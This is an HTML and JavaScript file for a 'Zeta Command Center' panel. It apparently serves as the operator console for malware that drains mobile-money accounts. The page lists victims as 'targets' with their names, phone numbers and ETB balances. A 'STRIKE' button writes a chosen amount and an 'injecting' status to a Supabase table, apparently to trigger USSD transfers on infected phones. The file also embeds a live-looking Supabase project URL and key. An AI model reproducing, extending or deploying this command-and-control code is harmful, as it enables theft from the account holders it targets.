<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zeta Control Panel</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
  :root { --neon-green: #00ff41; --bg-dark: #0a0a0a; --card-bg: #161616; }
  body { font-family: 'Courier New', Courier, monospace; background: var(--bg-dark); color: #e0e0e0; margin: 0; padding: 10px; }
  .container { max-width: 1200px; margin: 0 auto; }
  h1 { color: var(--neon-green); text-transform: uppercase; letter-spacing: 2px; border-bottom: 2px solid var(--neon-green); padding-bottom: 10px; font-size: 1.5rem; }
  
  /* Responsive Table Replacement for Mobile */
  .target-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px; }
  .target-card { background: var(--card-bg); border: 1px solid #333; padding: 15px; border-radius: 8px; position: relative; }
  .target-card.active { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
  
  /* Desktop View */
  @media (min-width: 768px) {
    .target-grid { grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); }
  }

  .field { margin-bottom: 8px; font-size: 0.9rem; }
  .label { color: #888; text-transform: uppercase; font-size: 0.7rem; }
  .value { color: #fff; }
  .balance { color: #ffcc00; font-weight: bold; font-size: 1.1rem; }
  
  .status-pill { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; background: #333; }
  .status-injecting { background: #aa0000; color: white; animation: blink 1s infinite; }
  
  @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

  input[type="number"] { background: #222; color: var(--neon-green); border: 1px solid #444; padding: 10px; border-radius: 4px; width: 60%; font-size: 1rem; }
  .btn-send { background: var(--neon-green); color: black; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; font-weight: bold; width: 35%; float: right; }
  
  #status-bar { font-size: 0.8rem; color: var(--neon-green); margin-bottom: 10px; background: #1a1a1a; padding: 5px 10px; border-radius: 4px; }
</style>
</head>
<body>

<div class="container">
  <h1>ZETA COMMAND CENTER</h1>
  <div id="status-bar">SYSTEM INITIALIZING...</div>
  <div id="targetList" class="target-grid">
    </div>
</div>

<script>
  const SUPABASE_URL = 'https://apdsaisgviycynayhppl.supabase.co';
  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFwZHNhaXNndml5Y3luYXlocHBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY3NTU5NjEsImV4cCI6MjA4MjMzMTk2MX0.BgCb2iJ8iywkG1pkKlc8HKdlZmNlFYQ4rZB5Kjq_dMU';
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

  function renderCard(target) {
    const container = document.getElementById('targetList');
    let card = document.getElementById(`card-${target.id}`);
    
    const isInjecting = target.ussd_status === 'injecting';
    const lastSeenDate = new Date(target.last_seen).toLocaleTimeString();

    const cardHtml = `
      <div class="target-card ${isInjecting ? 'active' : ''}" id="card-${target.id}">
        <div class="field">
          <span class="label">Target:</span> <span class="value"><strong>${target.full_name || 'UNKNOWN'}</strong> (${target.phone_number || 'N/A'})</span>
        </div>
        <div class="field">
          <span class="label">Balance:</span> <span class="balance">${target.current_balance} ETB</span>
        </div>
        <div class="field">
          <span class="label">Active USSD:</span> <span class="value" style="color:var(--neon-green)">${target.active_ussd || 'None'}</span>
        </div>
        <div class="field">
          <span class="status-pill ${isInjecting ? 'status-injecting' : ''}">${target.ussd_status || 'IDLE'}</span>
          <span class="label" style="margin-left:10px">Last Seen:</span> <span class="value">${lastSeenDate}</span>
        </div>
        <hr style="border:0; border-top:1px solid #333; margin:15px 0;">
        <div style="overflow:auto">
          <input type="number" id="amt-${target.id}" value="${target.target_amount}" placeholder="Amount">
          <button class="btn-send" onclick="updateAmount('${target.id}')">STRIKE</button>
        </div>
      </div>
    `;

    if (card) {
      card.outerHTML = cardHtml;
    } else {
      container.insertAdjacentHTML('beforeend', cardHtml);
    }
  }

  async function fetchTargets() {
    const { data, error } = await supabaseClient.from('targets').select('*').order('last_seen', { ascending: false });
    if (error) {
      document.getElementById('status-bar').innerText = 'ERROR: ' + error.message;
    } else {
      document.getElementById('targetList').innerHTML = '';
      data.forEach(renderCard);
      document.getElementById('status-bar').innerText = `ZETA ONLINE | ${data.length} NODES CONNECTED`;
    }
  }

  async function updateAmount(id) {
    const amount = document.getElementById(`amt-${id}`).value;
    const { error } = await supabaseClient
      .from('targets')
      .update({ target_amount: amount, ussd_status: 'injecting' })
      .eq('id', id);

    if (error) alert("Strike Failed: " + error.message);
    else console.log(`Command Pushed: ${amount} ETB`);
  }

  fetchTargets();

  // Real-time listener
  supabaseClient.channel('zeta-sync')
    .on('postgres_changes', { event: '*', schema: 'public', table: 'targets' }, payload => {
      if (payload.new) renderCard(payload.new);
    }).subscribe();
</script>
</body>
</html>
